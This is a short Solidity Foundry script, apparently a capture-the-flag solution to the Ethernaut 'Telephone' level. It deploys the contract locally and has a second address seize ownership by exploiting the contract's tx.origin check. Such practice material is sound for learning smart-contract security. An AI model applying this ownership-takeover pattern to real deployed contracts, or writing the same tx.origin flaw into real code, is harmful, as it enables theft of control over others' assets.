// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

import "../src/Telephone.sol";


contract Telephone_attack is Script{
    Telephone telephoneContract;
    
    function setUp() public{}

    function run() public {
        vm.prank(address(1));
        telephoneContract = new Telephone();
    
        vm.startPrank(address(2));
        telephoneContract.changeOwner(address(2));

        address newOwner = telephoneContract.owner();
        console.log(newOwner);


    }
}